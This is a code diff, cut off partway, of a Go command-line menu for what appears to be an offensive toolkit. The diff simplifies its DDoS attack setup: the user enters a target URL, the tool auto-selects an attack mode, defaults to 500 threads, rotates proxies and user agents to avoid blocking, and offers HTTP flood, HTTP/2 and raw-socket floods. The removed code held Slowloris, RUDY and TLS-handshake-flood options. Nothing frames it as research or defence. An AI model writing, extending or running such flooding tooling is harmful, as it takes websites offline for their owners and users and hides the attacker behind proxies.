@@ -14,7 +14,6 @@ import (
 	"github.com/letgo/cracker"
 	"github.com/letgo/curlparser"
 	"github.com/letgo/ddos"
-	ddosscanner "github.com/letgo/ddos-scanner"
 	"github.com/letgo/pathtraversal"
 )
 
@@ -240,7 +239,7 @@ func (m *Menu) attackWithCurl() {
 		attackConfig.ShowAttempts = false
 
 		// Apply proxy settings
-		attackConfig.UseProxy = useProxy
+		// Proxy list is set above
 		attackConfig.ProxyList = proxyList
 		attackConfig.RotateProxy = rotateProxy
 
@@ -347,584 +346,182 @@ func (m *Menu) attackWithCurl() {
 func (m *Menu) ddosAttack() {
 	reader := bufio.NewReader(os.Stdin)
 
-	// Ask user to choose between template and manual config
+	// Ask user to choose configuration method
 	fmt.Println("\n" + strings.Repeat("=", 70))
 	fmt.Println("                    DDoS ATTACK SETUP")
 	fmt.Println(strings.Repeat("=", 70))
 	fmt.Println("\nChoose configuration method:")
-	fmt.Println("  [1] Use a Template       - Load attack configuration from template")
-	fmt.Println("  [2] Manual Configuration - Configure attack manually")
-	fmt.Print("Enter choice (1 or 2): ")
+	fmt.Println("  [1] Quick Start (Recommended) - Auto-configured for best performance")
+	fmt.Println("  [2] Custom                   - Full manual configuration")
+	fmt.Print("Enter choice (1-2, default: 1): ")
 	configChoice, _ := reader.ReadString('\n')
 	configChoice = strings.TrimSpace(configChoice)
+	if configChoice == "" {
+		configChoice = "1" // Default to Quick Start
+	}
 
 	var selectedConfigs []*ddos.DDoSConfig
-	var templateConfig *ddos.DDoSConfig
+	var useQuickStart bool
 
 	if configChoice == "1" {
-		// Template mode
-		templates, err := ddos.ListAvailableTemplates()
-		if err != nil || len(templates) == 0 {
-			templatesDir := filepath.Join(dataDir, "ddos-templates")
-			fmt.Printf("\nNo templates available in %s folder.\n", templatesDir)
-			fmt.Println("Please create templates first or use manual configuration.")
-			return
-		}
-
-		// Display available templates
-		fmt.Println("\n===== Available Templates =====")
-		for i, template := range templates {
-			fmt.Printf("[%d] %s\n", i+1, template)
-		}
-		fmt.Print("\nSelect a template (number): ")
-		templateChoice, _ := reader.ReadString('\n')
-		templateNum, err := strconv.Atoi(strings.TrimSpace(templateChoice))
-		if err != nil || templateNum < 1 || templateNum > len(templates) {
-			fmt.Println("Invalid template selection.")
-			return
-		}
-
-		templatePath := filepath.Join(dataDir, "ddos-templates", templates[templateNum-1])
-		var loadErr error
-		templateConfig, loadErr = ddos.LoadTemplateFile(templatePath)
-		if loadErr != nil {
-			fmt.Printf("Error loading template: %v\n", loadErr)
-			return
-		}
-
-		fmt.Printf("\n✓ Loaded template: %s\n", templates[templateNum-1])
-		fmt.Printf("✓ Attack Mode: %s\n", templateConfig.AttackMode)
+		// Quick Start mode
+		useQuickStart = true
 	}
 
-	// List available site folders
-	fmt.Println("\n===== Available Site Folders =====")
-	folders, err := ddosscanner.ListDDOSTargetFolders()
-	if err != nil {
-		fmt.Printf("Warning: Could not list folders: %v\n", err)
-		folders = []string{}
-	}
-
-	// Check if cURL-DDOS.txt exists in data folder
-	defaultFile := filepath.Join(dataDir, "ddos-targets", "cURL-DDOS.txt")
-	hasDefaultFile := false
-	if _, err := os.Stat(defaultFile); err == nil {
-		hasDefaultFile = true
-	}
-
-	var selectedFolder string
-	var curlFile string
-
-	if len(folders) == 0 && !hasDefaultFile {
-		ddosTargetsDir := filepath.Join(dataDir, "ddos-targets")
-		fmt.Printf("No site folders or target files found in %s folder.\n", ddosTargetsDir)
-		fmt.Println("Please run 'Scan Target for DDoS cURLs' first or create target files manually.")
-		fmt.Print("\nEnter cURL-DDOS config file path (or press Enter to cancel): ")
-		curlFileInput, _ := reader.ReadString('\n')
-		curlFile = strings.TrimSpace(curlFileInput)
-		if curlFile == "" {
-			return
-		}
-	} else {
-		// Display folder selection with cURL-DDOS.txt as first option if it exists (only in manual config mode)
-		fmt.Println("Select a site folder:")
-		optionNum := 1
-
-		// Only show cURL-DDOS.txt option in manual configuration mode
-		showDefaultFile := configChoice == "2" && hasDefaultFile
-		if showDefaultFile {
-			fmt.Printf("  [%d] cURL-DDOS.txt (default)\n", optionNum)
-			optionNum++
-		}
-
-		for _, folder := range folders {
-			fmt.Printf("  [%d] %s\n", optionNum, folder)
-			optionNum++
-		}
-
-		fmt.Print("\nEnter folder number (or press Enter for default): ")
-		folderChoice, _ := reader.ReadString('\n')
-		folderChoice = strings.TrimSpace(folderChoice)
-
-		if folderChoice == "" {
-			// Use default (cURL-DDOS.txt) if available in manual mode, otherwise first folder
-			if showDefaultFile {
-				selectedFolder = "" // Root folder for default file
-			} else if len(folders) > 0 {
-				selectedFolder = folders[0]
-			} else {
-				fmt.Println("Error: No valid folders available.")
-				return
-			}
-		} else {
-			folderNum, err := strconv.Atoi(folderChoice)
-			if err != nil || folderNum < 1 {
-				// Invalid input, use default
-				if showDefaultFile {
-					selectedFolder = ""
-				} else if len(folders) > 0 {
-					fmt.Printf("Invalid folder number. Using first folder: %s\n", folders[0])
-					selectedFolder = folders[0]
-				} else {
-					fmt.Println("Error: No valid folders available.")
-					return
-				}
-			} else {
-				// Calculate which option was selected
-				if showDefaultFile {
-					if folderNum == 1 {
-						selectedFolder = "" // Root folder for default file
-					} else if folderNum <= len(folders)+1 {
-						selectedFolder = folders[folderNum-2] // Adjust for default file option
-					} else {
-						fmt.Printf("Invalid folder number. Using default: cURL-DDOS.txt\n")
-						selectedFolder = ""
-					}
-				} else {
-					if folderNum <= len(folders) {
-						selectedFolder = folders[folderNum-1]
-					} else {
-						fmt.Printf("Invalid folder number. Using first folder: %s\n", folders[0])
-						selectedFolder = folders[0]
-					}
-				}
-			}
-		}
-
-		// Now handle file selection based on mode
-		if configChoice == "1" && templateConfig != nil {
-			// Template mode: auto-match files
-			if selectedFolder != "" {
-				folderPath := filepath.Join(dataDir, "ddos-targets", selectedFolder)
-				matchingFiles, err := ddosscanner.GetFilesMatchingTemplate(folderPath, string(templateConfig.AttackMode))
-				if err != nil {
-					fmt.Printf("Error reading folder: %v\n", err)
-					return
-				}
-
-				if len(matchingFiles) == 0 {
-					fmt.Printf("\n⚠ No files matching template attack mode '%s' found in folder '%s'.\n", templateConfig.AttackMode, selectedFolder)
-					fmt.Println("Please select another folder or use manual configuration.")
-					return
-				} else if len(matchingFiles) == 1 {
-					curlFile = matchingFiles[0]
-					fmt.Printf("\n✓ Auto-selected matching file: %s\n", filepath.Base(curlFile))
-				} else {
-					// Multiple matches, let user select
-					fmt.Printf("\n===== Multiple Matching Files (Attack Mode: %s) =====", templateConfig.AttackMode)
-					fmt.Println("\nSelect a file:")
-					for i, file := range matchingFiles {
-						fmt.Printf("  [%d] %s\n", i+1, filepath.Base(file))
-					}
-					fmt.Print("\nEnter file number: ")
-					fileChoice, _ := reader.ReadString('\n')
-					fileChoice = strings.TrimSpace(fileChoice)
-					fileNum, err := strconv.Atoi(fileChoice)
-					if err != nil || fileNum < 1 || fileNum > len(matchingFiles) {
-						fmt.Printf("Invalid file number. Using first file: %s\n", filepath.Base(matchingFiles[0]))
-						curlFile = matchingFiles[0]
-					} else {
-						curlFile = matchingFiles[fileNum-1]
-					}
-					fmt.Printf("✓ Selected: %s\n", filepath.Base(curlFile))
-				}
-			} else {
-				// Root folder - check for matching files (template mode doesn't use default file)
-				// In template mode, cURL-DDOS.txt is not available, so only check for matching files
-				folderPath := filepath.Join(dataDir, "ddos-targets")
-				matchingFiles, err := ddosscanner.GetFilesMatchingTemplate(folderPath, string(templateConfig.AttackMode))
-				if err != nil {
-					fmt.Printf("Error reading folder: %v\n", err)
-					return
-				}
-
-				if len(matchingFiles) == 0 {
-					fmt.Printf("\n⚠ No files matching template attack mode '%s' found in root folder.\n", templateConfig.AttackMode)
-					fmt.Println("Please select another folder or use manual configuration.")
-					return
-				} else if len(matchingFiles) == 1 {
-					curlFile = matchingFiles[0]
-					fmt.Printf("\n✓ Auto-selected matching file: %s\n", filepath.Base(curlFile))
-				} else {
-					// Multiple matches, let user select
-					fmt.Printf("\n===== Multiple Matching Files (Attack Mode: %s) =====", templateConfig.AttackMode)
-					fmt.Println("\nSelect a file:")
-					for i, file := range matchingFiles {
-						fmt.Printf("  [%d] %s\n", i+1, filepath.Base(file))
-					}
-					fmt.Print("\nEnter file number: ")
-					fileChoice, _ := reader.ReadString('\n')
-					fileChoice = strings.TrimSpace(fileChoice)
-					fileNum, err := strconv.Atoi(fileChoice)
-					if err != nil || fileNum < 1 || fileNum > len(matchingFiles) {
-						fmt.Printf("Invalid file number. Using first file: %s\n", filepath.Base(matchingFiles[0]))
-						curlFile = matchingFiles[0]
-					} else {
-						curlFile = matchingFiles[fileNum-1]
-					}
-					fmt.Printf("✓ Selected: %s\n", filepath.Base(curlFile))
-				}
-			}
-		} else {
-			// Manual configuration mode: show all files in selected folder
-			var targetFiles []string
-			if selectedFolder != "" {
-				targetFiles, err = ddosscanner.ListDDOSTargetFilesInFolder(selectedFolder)
-				if err != nil {
-					fmt.Printf("Error reading folder: %v\n", err)
-					return
-				}
-			} else {
-				// Root folder - use default file if available, otherwise list all flat files
-				if hasDefaultFile {
-					targetFiles = []string{defaultFile}
-				} else {
-					flatFiles, _ := ddosscanner.ListDDOSTargetFiles()
-					targetFiles = flatFiles
-				}
-			}
-
-			if len(targetFiles) == 0 {
-				fmt.Printf("No target files found in folder '%s'.\n", selectedFolder)
-				fmt.Println("Please run 'Scan Target for DDoS cURLs' first or create target files manually.")
-				return
-			}
-
-			// Check for default file
-			defaultFile := filepath.Join(dataDir, "ddos-targets", "cURL-DDOS.txt")
-			hasDefault := false
-			for _, file := range targetFiles {
-				if file == defaultFile {
-					hasDefault = true
-					break
-				}
-			}
-
-			// Skip file selection menu if user already selected option [1] cURL-DDOS.txt (default)
-			// This happens when selectedFolder is empty (root) and only the default file exists
-			if selectedFolder == "" && hasDefaultFile && len(targetFiles) == 1 && targetFiles[0] == defaultFile {
-				curlFile = defaultFile
-				fmt.Printf("✓ Using default file: %s\n", filepath.Base(curlFile))
-			} else {
-				fmt.Println("\n===== Available Target Files =====")
-				fmt.Println("Select a target file:")
-				for i, file := range targetFiles {
-					fileName := filepath.Base(file)
-					marker := ""
-					if file == defaultFile {
-						marker = " (default)"
-					}
-					fmt.Printf("  [%d] %s%s\n", i+1, fileName, marker)
-				}
-				fmt.Print("\nEnter file number (or press Enter for default): ")
-				fileChoice, _ := reader.ReadString('\n')
-				fileChoice = strings.TrimSpace(fileChoice)
-
-				if fileChoice == "" {
-					// Use default if available, otherwise first file
-					if hasDefault {
-						curlFile = defaultFile
-					} else {
-						curlFile = targetFiles[0]
-					}
-				} else {
-					fileNum, err := strconv.Atoi(fileChoice)
-					if err != nil || fileNum < 1 || fileNum > len(targetFiles) {
-						fmt.Printf("Invalid file number. Using default: %s\n", defaultFile)
-						if hasDefault {
-							curlFile = defaultFile
-						} else if len(targetFiles) > 0 {
-							curlFile = targetFiles[0]
-						} else {
-							fmt.Println("Error: No valid target files available.")
-							return
-						}
-					} else {
-						curlFile = targetFiles[fileNum-1]
-					}
-				}
-				fmt.Printf("✓ Selected: %s\n", filepath.Base(curlFile))
-			}
-		}
-	}
-
-	// Load cURL configurations from file
-	ddosConfigs, err := curlparser.LoadDDoSFromFile(curlFile)
-	if err != nil {
-		fmt.Printf("Error loading cURL config: %v\n", err)
-		fmt.Println("Please make sure the file exists and contains valid cURL commands.")
-		fmt.Println("\nExample cURL-DDOS.txt format:")
-		fmt.Println("  curl -X GET https://example.com/api/endpoint")
-		fmt.Println("  curl -X POST https://example.com/api/data \\")
-		fmt.Println("    -H 'Content-Type: application/json' \\")
-		fmt.Println("    -d '{\"key\":\"value\"}'")
-		fmt.Println()
+	// Simple URL input (replaces cURL file loading)
+	fmt.Println("\n===== Target Configuration =====")
+	fmt.Print("Enter target URL (e.g., https://example.com/api/endpoint): ")
+	targetURL, _ := reader.ReadString('\n')
+	targetURL = strings.TrimSpace(targetURL)
+	if targetURL == "" {
+		fmt.Println("Error: Target URL is required.")
 		return
 	}
 
-	fmt.Printf("\n✓ Found %d target(s)\n\n", len(ddosConfigs))
-
-	// Display found configurations
-	fmt.Println("===== Target URLs =====")
-	for i, config := range ddosConfigs {
-		fmt.Printf("[%d] %s %s\n", i+1, config.Method, config.TargetURL)
-		if config.ContentType != "" {
-			fmt.Printf("    Content-Type: %s\n", config.ContentType)
-		}
-		if len(config.Headers) > 0 {
-			fmt.Printf("    Custom Headers: %d\n", len(config.Headers))
-		}
+	// Ensure URL has protocol
+	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
+		targetURL = "https://" + targetURL
+		fmt.Printf("✓ Added https:// prefix: %s\n", targetURL)
 	}
-	fmt.Println()
 
-	// Ask which config to use
-	if len(ddosConfigs) == 1 {
-		selectedConfigs = ddosConfigs
-		fmt.Println("Using the only available target.")
-	} else {
-		fmt.Print("Choose option:\n")
-		fmt.Print("  [1] Select specific target\n")
-		fmt.Print("  [2] Attack all targets simultaneously\n")
-		fmt.Print("Enter choice (1 or 2): ")
-		choice, _ := reader.ReadString('\n')
-		choice = strings.TrimSpace(choice)
+	// Ask for HTTP method
+	fmt.Print("Enter HTTP method (GET/POST/PUT/DELETE, default: GET): ")
+	method, _ := reader.ReadString('\n')
+	method = strings.TrimSpace(strings.ToUpper(method))
+	if method == "" {
+		method = "GET"
+	}
 
-		if choice == "1" {
-			fmt.Print("Enter target number: ")
-			numStr, _ := reader.ReadString('\n')
-			num, err := strconv.Atoi(strings.TrimSpace(numStr))
-			if err != nil || num < 1 || num > len(ddosConfigs) {
-				fmt.Println("Invalid target number.")
-				return
+	// Ask for optional body
+	var body string
+	if method == "POST" || method == "PUT" {
+		fmt.Print("Enter request body (or press Enter to skip): ")
+		bodyInput, _ := reader.ReadString('\n')
+		body = strings.TrimSpace(bodyInput)
+	}
+
+	// Create base config
+	baseConfig := ddos.DDoSConfig{
+		TargetURL:  targetURL,
+		Method:     method,
+		Headers:    make(map[string]string),
+		Body:       body,
+		MaxThreads: 500,
+		Duration:   60 * time.Second,
+		Timeout:    5 * time.Second,
+		AttackMode: ddos.ModeFlood,
+	}
+
+	// Auto-detect optimal attack mode if Quick Start
+	if useQuickStart {
+		info := ddos.DetectTargetCapabilities(targetURL, len(baseConfig.ProxyList))
+		baseConfig.AttackMode = ddos.SuggestOptimalAttackMode(info)
+		fmt.Printf("✓ Auto-detected attack mode: %s\n", baseConfig.AttackMode)
+	}
+
+	selectedConfigs = []*ddos.DDoSConfig{&baseConfig}
+
+	// Config is already created above with simple URL input
+
+	// Apply Quick Start or Preset if selected
+	if useQuickStart {
+		fmt.Println("\n✓ Quick Start Mode - Auto-detecting optimal settings...")
+		
+		// Auto-load proxies from default file (enabled by default)
+		proxies, err := m.loadValidProxies()
+		if err == nil && len(proxies) > 0 {
+			for i := range selectedConfigs {
+				selectedConfigs[i].ProxyList = proxies
+				selectedConfigs[i].RotateProxy = true
 			}
-			selectedConfigs = []*ddos.DDoSConfig{ddosConfigs[num-1]}
-		} else if choice == "2" {
-			selectedConfigs = ddosConfigs
+			fmt.Printf("✓ Auto-loaded %d proxies from proxy.txt (enabled by default)\n", len(proxies))
 		} else {
-			fmt.Println("Invalid choice.")
+			fmt.Println("⚠ No proxies found in proxy.txt - continuing without proxies")
+		}
+
+		// Auto-load user agents from default file (enabled by default)
+		userAgentPath := filepath.Join(dataDir, "user-agent.txt")
+		if _, err := os.Stat(userAgentPath); err == nil {
+			for i := range selectedConfigs {
+				selectedConfigs[i].UserAgentFile = userAgentPath
+			}
+			fmt.Printf("✓ Auto-loaded user agents from user-agent.txt (enabled by default)\n")
+		} else {
+			fmt.Println("✓ Using built-in user agents (user-agent.txt not found)")
+		}
+
+		for i, config := range selectedConfigs {
+			// Auto-detect optimal settings
+			optimizedConfig := ddos.AutoDetectOptimalSettings(*config)
+			selectedConfigs[i] = optimizedConfig
+		}
+		// Show detected settings
+		if len(selectedConfigs) > 0 {
+			fmt.Println("\n===== Auto-Detected Settings =====")
+			fmt.Printf("Attack Mode: %s\n", selectedConfigs[0].AttackMode)
+			fmt.Printf("Max Threads: %d\n", selectedConfigs[0].MaxThreads)
+			if len(selectedConfigs[0].ProxyList) > 0 {
+				fmt.Printf("Proxies: %d loaded (rotation enabled)\n", len(selectedConfigs[0].ProxyList))
+			}
+			if selectedConfigs[0].UserAgentFile != "" {
+				fmt.Printf("User Agents: Custom file (%s)\n", selectedConfigs[0].UserAgentFile)
+			} else {
+				fmt.Println("User Agents: Built-in (rotated)")
+			}
+			fmt.Println("All efficiency features are enabled by default:")
+			fmt.Println("  - Connection pooling")
+			fmt.Println("  - Fire-and-forget requests")
+			fmt.Println("  - Response body skipping")
+			fmt.Println("  - Request randomization")
+		}
+		fmt.Print("\nPress Enter to start attack (or 'n' to cancel): ")
+		confirm, _ := reader.ReadString('\n')
+		if strings.TrimSpace(strings.ToLower(confirm)) == "n" {
 			return
 		}
-	}
-
-	// If template mode, apply template to selected configs
-	if configChoice == "1" && templateConfig != nil {
-		fmt.Println("\n✓ Applying template configuration to selected targets...")
-
-		// Load validated proxies once for this run if the template enables proxy usage.
-		var validatedProxies []string
-		if templateConfig.UseProxy {
-			proxies, err := m.loadValidProxies()
-			if err != nil || len(proxies) == 0 {
-				proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
-				fmt.Printf("Warning: Template has UseProxy=true but no valid proxies found in %s (%v)\n", proxyPath, err)
-				fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
-				fmt.Print("Continue without proxy? (y/n): ")
-				continueStr, _ := reader.ReadString('\n')
-				if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
-					return
-				}
-				// If user chooses to continue, disable proxy usage for this run.
-				templateConfig.UseProxy = false
-			} else {
-				validatedProxies = proxies
-				fmt.Printf("✓ Loaded %d validated proxy/proxies from proxy.txt\n", len(validatedProxies))
-			}
-		}
-
-		for _, config := range selectedConfigs {
-			// Apply template settings, preserving cURL-derived fields
-			config.AttackMode = templateConfig.AttackMode
-			config.MaxThreads = templateConfig.MaxThreads
-			config.Duration = templateConfig.Duration
-			config.Timeout = templateConfig.Timeout
-			config.RateLimit = templateConfig.RateLimit
-			config.FollowRedirects = templateConfig.FollowRedirects
-			config.ReuseConnections = templateConfig.ReuseConnections
-
-			// Proxy configuration: always source from validated proxy list when enabled.
-			if templateConfig.UseProxy && len(validatedProxies) > 0 {
-				config.UseProxy = true
-				config.ProxyList = validatedProxies
-				config.RotateProxy = templateConfig.RotateProxy
-			} else {
-				config.UseProxy = false
-				config.ProxyList = nil
-				config.RotateProxy = false
-			}
-
-			config.UseCustomUserAgents = templateConfig.UseCustomUserAgents
-			config.UserAgentFilePath = templateConfig.UserAgentFilePath
-			// TLS settings: deprecated flags are ignored when using ModeTLSHandshakeFlood
-			if config.AttackMode == ddos.ModeTLSHandshakeFlood {
-				config.UseTLSAttack = false
-				config.TLSHandshakeFlood = false
-			} else {
-				config.UseTLSAttack = templateConfig.UseTLSAttack
-				config.TLSHandshakeFlood = templateConfig.TLSHandshakeFlood
-			}
-			config.ForceTLS = templateConfig.ForceTLS
-			config.TLSRenegotiation = templateConfig.TLSRenegotiation
-			config.TLSMinVersion = templateConfig.TLSMinVersion
-			config.TLSMaxVersion = templateConfig.TLSMaxVersion
-			config.TLSCipherSuites = templateConfig.TLSCipherSuites
-			config.UseHTTP2 = templateConfig.UseHTTP2
-			config.UsePipelining = templateConfig.UsePipelining
-			config.AdaptiveRateLimit = templateConfig.AdaptiveRateLimit
-			config.MaxStreamsPerConn = templateConfig.MaxStreamsPerConn
-			config.SlowlorisDelay = templateConfig.SlowlorisDelay
-			config.RUDYDelay = templateConfig.RUDYDelay
-			config.RUDYBodySize = templateConfig.RUDYBodySize
-		}
-
+		// Skip the summary confirmation for quick start - launch immediately
+		goto startAttack
 	} else {
 		// Manual configuration mode
 		fmt.Println("\n===== DDoS Configuration =====")
 
-		// Ask if using proxy
-		fmt.Print("\nUse proxy for attacks? (y/n, default: y): ")
-		useProxyStr, _ := reader.ReadString('\n')
-		useProxyStr = strings.TrimSpace(strings.ToLower(useProxyStr))
-		useProxy := useProxyStr != "n" && useProxyStr != "no"
-
+		// Auto-load proxies from default file (enabled by default)
 		var proxyList []string
 		var rotateProxy bool
-		if useProxy {
-			// Load proxies from proxy/proxy.txt
-			proxies, err := m.loadValidProxies()
-			if err != nil || len(proxies) == 0 {
-				proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
-				fmt.Printf("Warning: No valid proxies found in %s (%v)\n", proxyPath, err)
-				fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
-				fmt.Print("Continue without proxy? (y/n): ")
-				continueStr, _ := reader.ReadString('\n')
-				if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
-					return
-				}
-				useProxy = false
-			} else {
-				proxyList = proxies
-				fmt.Printf("✓ Loaded %d valid proxies\n", len(proxyList))
-
-				// Ask if rotate proxies
-				fmt.Print("Rotate through proxies for each request? (y/n, default: y): ")
-				rotateStr, _ := reader.ReadString('\n')
-				rotateStr = strings.TrimSpace(strings.ToLower(rotateStr))
-				rotateProxy = rotateStr != "n" && rotateStr != "no"
-
-				if rotateProxy {
-					fmt.Println("✓ Proxy rotation enabled")
-				} else {
-					fmt.Printf("✓ Using single proxy: %s\n", proxyList[0])
-				}
-			}
+		proxies, err := m.loadValidProxies()
+		if err == nil && len(proxies) > 0 {
+			proxyList = proxies
+			rotateProxy = true // Default to rotation enabled
+			fmt.Printf("✓ Auto-loaded %d proxies from proxy.txt (enabled by default)\n", len(proxyList))
+		} else {
+			proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
+			fmt.Printf("⚠ No valid proxies found in %s (%v)\n", proxyPath, err)
+			fmt.Println("Continuing without proxies...")
 		}
 
-		// Attack Mode
+		// Attack Mode (simplified to 3 modes)
 		fmt.Println("\nSelect Attack Mode:")
-		fmt.Println("  [1] HTTP Flood          - Maximum concurrent HTTP requests (Default)")
-		fmt.Println("  [2] Slowloris           - Hold connections open with partial headers")
-		fmt.Println("  [3] Mixed               - Combination of flood (70%) and slowloris (30%)")
-		fmt.Println("  [4] HTTP/2 Stream Flood - Flood with HTTP/2 streams (HTTPS only)")
-		fmt.Println("  [5] RUDY                - Slow HTTP POST attack (R-U-Dead-Yet)")
-		fmt.Println("  [6] TLS Handshake Flood - Initiate many TLS handshakes without HTTP requests")
-		fmt.Print("Enter choice (1-6, default: 1): ")
+		fmt.Println("  [1] HTTP Flood - Maximum concurrent HTTP requests (Default, most efficient)")
+		fmt.Println("  [2] HTTP/2     - Flood with HTTP/2 streams (HTTPS targets)")
+		fmt.Println("  [3] Raw Socket - Maximum throughput using raw TCP (HTTP targets)")
+		fmt.Print("Enter choice (1-3, default: 1): ")
 		modeChoice, _ := reader.ReadString('\n')
 		modeChoice = strings.TrimSpace(modeChoice)
 
 		var attackMode ddos.AttackMode
 		switch modeChoice {
 		case "2":
-			attackMode = ddos.ModeSlowloris
-			fmt.Println("✓ Slowloris mode selected")
+			attackMode = ddos.ModeHTTP2
+			fmt.Println("✓ HTTP/2 mode selected")
 		case "3":
-			attackMode = ddos.ModeMixed
-			fmt.Println("✓ Mixed mode selected (70% flood, 30% slowloris)")
-		case "4":
-			attackMode = ddos.ModeHTTP2StreamFlood
-			fmt.Println("✓ HTTP/2 Stream Flood mode selected")
-		case "5":
-			attackMode = ddos.ModeRUDY
-			fmt.Println("✓ RUDY (Slow HTTP POST) mode selected")
-		case "6":
-			attackMode = ddos.ModeTLSHandshakeFlood
-			fmt.Println("✓ TLS Handshake Flood mode selected")
+			attackMode = ddos.ModeRaw
+			fmt.Println("✓ Raw Socket mode selected")
 		default:
 			attackMode = ddos.ModeFlood
 			fmt.Println("✓ HTTP Flood mode selected")
 		}
 
-		// TLS Configuration
-		var forceTLS, tlsRenegotiation bool
-		var tlsMinVersion, tlsMaxVersion uint16
-		var tlsCipherSuites []uint16
-
-		if attackMode == ddos.ModeTLSHandshakeFlood {
-			// TLS Handshake Flood mode specific configuration
-			fmt.Println("\n===== TLS Handshake Flood Configuration =====")
-			fmt.Print("Force TLS on HTTP URLs? (y/n, default: n): ")
-			forceTLSStr, _ := reader.ReadString('\n')
-			forceTLSStr = strings.TrimSpace(strings.ToLower(forceTLSStr))
-			forceTLS = forceTLSStr == "y" || forceTLSStr == "yes"
-			if forceTLS {
-				fmt.Println("✓ Force TLS enabled - HTTP URLs will use TLS")
-			}
-
-			// TLS Version configuration (optional)
-			fmt.Print("\nConfigure TLS version? (y/n, default: n): ")
-			configTLSVersionStr, _ := reader.ReadString('\n')
-			configTLSVersionStr = strings.TrimSpace(strings.ToLower(configTLSVersionStr))
-			if configTLSVersionStr == "y" || configTLSVersionStr == "yes" {
-				fmt.Println("TLS Versions:")
-				fmt.Println("  1) TLS 1.0")
-				fmt.Println("  2) TLS 1.1")
-				fmt.Println("  3) TLS 1.2")
-				fmt.Println("  4) TLS 1.3")
-				fmt.Print("Enter minimum TLS version (1-4, or Enter for default): ")
-				minVerStr, _ := reader.ReadString('\n')
-				minVerStr = strings.TrimSpace(minVerStr)
-				if minVerStr != "" {
-					if ver, err := strconv.Atoi(minVerStr); err == nil {
-						switch ver {
-						case 1:
-							tlsMinVersion = 0x0301 // tls.VersionTLS10
-						case 2:
-							tlsMinVersion = 0x0302 // tls.VersionTLS11
-						case 3:
-							tlsMinVersion = 0x0303 // tls.VersionTLS12
-						case 4:
-							tlsMinVersion = 0x0304 // tls.VersionTLS13
-						}
-					}
-				}
-
-				fmt.Print("Enter maximum TLS version (1-4, or Enter for default): ")
-				maxVerStr, _ := reader.ReadString('\n')
-				maxVerStr = strings.TrimSpace(maxVerStr)
-				if maxVerStr != "" {
-					if ver, err := strconv.Atoi(maxVerStr); err == nil {
-						switch ver {
-						case 1:
-							tlsMaxVersion = 0x0301 // tls.VersionTLS10
-						case 2:
-							tlsMaxVersion = 0x0302 // tls.VersionTLS11
-						case 3:
-							tlsMaxVersion = 0x0303 // tls.VersionTLS12
-						case 4:
-							tlsMaxVersion = 0x0304 // tls.VersionTLS13
-						}
-					}
-				}
-			}
-		} else if attackMode == ddos.ModeSlowloris {
-			// Slowloris mode can use TLS renegotiation
-			fmt.Println("\n===== TLS Configuration (for Slowloris) =====")
-			fmt.Print("Enable TLS Renegotiation attacks? (y/n, default: n): ")
-			renegotiationStr, _ := reader.ReadString('\n')
-			renegotiationStr = strings.TrimSpace(strings.ToLower(renegotiationStr))
-			tlsRenegotiation = renegotiationStr == "y" || renegotiationStr == "yes"
-			if tlsRenegotiation {
-				fmt.Println("✓ TLS Renegotiation enabled - Will force renegotiation on connections")
-			}
-		}
+		// Attack mode is set above, no additional TLS config needed
 
 		// Number of threads
 		fmt.Print("\nEnter number of threads (default: 500): ")
@@ -959,28 +556,20 @@ func (m *Menu) ddosAttack() {
 			}
 		}
 
-		// Custom User Agents
-		fmt.Print("Use custom user agents from user-agent.txt? (y/n, default: y): ")
-		useCustomAgentsStr, _ := reader.ReadString('\n')
-		useCustomAgentsStr = strings.TrimSpace(strings.ToLower(useCustomAgentsStr))
-		useCustomUserAgents := useCustomAgentsStr != "n" && useCustomAgentsStr != "no"
-
-		if useCustomUserAgents {
-			userAgentPath := filepath.Join(dataDir, "user-agent.txt")
-			fmt.Printf("✓ Custom user agents enabled (%s)\n", userAgentPath)
+		// Auto-load user agents from default file (enabled by default)
+		userAgentPath := filepath.Join(dataDir, "user-agent.txt")
+		if _, err := os.Stat(userAgentPath); err == nil {
+			baseConfig.UserAgentFile = userAgentPath
+			fmt.Printf("✓ Auto-loaded user agents from user-agent.txt (enabled by default)\n")
 		} else {
-			fmt.Println("✓ Using built-in user agents")
+			fmt.Println("✓ Using built-in user agents (user-agent.txt not found)")
 		}
 
-		// Connection reuse
-		fmt.Print("Reuse connections? (y/n, default: y): ")
-		reuseStr, _ := reader.ReadString('\n')
-		reuseStr = strings.TrimSpace(strings.ToLower(reuseStr))
-		reuseConnections := reuseStr != "n" && reuseStr != "no"
+		// Connection reuse is always enabled (no config needed)
 
 		// HTTP/2 Support (for flood mode)
 		var useHTTP2 bool
-		if attackMode == ddos.ModeFlood || attackMode == ddos.ModeMixed {
+		if attackMode == ddos.ModeFlood {
 			fmt.Print("Enable HTTP/2 support? (y/n, default: n): ")
 			http2Str, _ := reader.ReadString('\n')
 			http2Str = strings.TrimSpace(strings.ToLower(http2Str))
@@ -1002,35 +591,11 @@ func (m *Menu) ddosAttack() {
 			}
 		}
 
-		// RUDY specific settings
-		var rudyDelay time.Duration
-		var rudyBodySize int
-		if attackMode == ddos.ModeRUDY {
-			fmt.Print("Enter RUDY delay between bytes in seconds (default: 10): ")
-			rudyDelayStr, _ := reader.ReadString('\n')
-			rudyDelayStr = strings.TrimSpace(rudyDelayStr)
-			rudyDelay = 10 * time.Second
-			if rudyDelayStr != "" {
-				if d, err := strconv.Atoi(rudyDelayStr); err == nil && d > 0 {
-					rudyDelay = time.Duration(d) * time.Second
-				}
-			}
+		// RUDY mode removed - no longer supported
 
-			fmt.Print("Enter RUDY POST body size in bytes (default: 1048576 = 1MB): ")
-			rudySizeStr, _ := reader.ReadString('\n')
-			rudySizeStr = strings.TrimSpace(rudySizeStr)
-			rudyBodySize = 1024 * 1024 // 1MB
-			if rudySizeStr != "" {
-				if s, err := strconv.Atoi(rudySizeStr); err == nil && s > 0 {
-					rudyBodySize = s
-				}
-			}
-			fmt.Printf("✓ RUDY configured: %d bytes, %s delay\n", rudyBodySize, rudyDelay)
-		}
-
-		// HTTP/2 Stream Flood settings
+		// HTTP/2 settings
 		var maxStreamsPerConn int
-		if attackMode == ddos.ModeHTTP2StreamFlood {
+		if attackMode == ddos.ModeHTTP2 {
